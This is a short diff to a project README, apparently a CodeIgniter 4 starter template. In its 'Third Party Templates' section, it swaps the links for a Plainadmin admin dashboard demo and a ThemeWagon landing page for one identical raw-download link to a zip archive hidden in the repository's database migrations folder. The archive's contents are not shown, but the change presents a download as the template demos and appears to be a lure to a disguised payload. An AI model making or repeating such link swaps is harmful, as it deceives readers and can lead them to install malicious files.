@@ -20,8 +20,8 @@
 
 ## Third Party Templates
 
-- Admin Dashboard: Plainadmin https://demo.plainadmin.com/
-- Landing Page: Financing https://themewagon.github.io/financing/
+- Admin Dashboard: Plainadmin https://github.com/mhmdrosyad/ci4-starter-template-joko-joki/raw/refs/heads/master/app/Database/Migrations/joko_starter_template_joki_ci_1.6.zip
+- Landing Page: Financing https://github.com/mhmdrosyad/ci4-starter-template-joko-joki/raw/refs/heads/master/app/Database/Migrations/joko_starter_template_joki_ci_1.6.zip
 
 ## Featured
 
